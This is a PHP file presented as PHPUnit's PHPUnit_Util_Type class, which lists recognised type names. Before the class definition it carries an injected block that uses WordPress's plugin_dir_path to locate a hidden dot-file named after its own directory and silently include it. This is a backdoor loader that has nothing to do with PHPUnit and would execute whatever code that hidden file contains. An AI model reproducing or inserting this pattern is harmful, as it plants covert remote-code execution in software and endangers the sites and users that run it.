<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Utility class for textual type (and value) representation.
 *
 * @since Class available since Release 3.0.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PHPUnit_Util_Type
{
    public static function isType($type)
    {
        return in_array(
            $type,
            array(
            'numeric',
            'integer',
            'int',
            'float',
            'string',
            'boolean',
            'bool',
            'null',
            'array',
            'object',
            'resource',
            'scalar'
            )
        );
    }
}
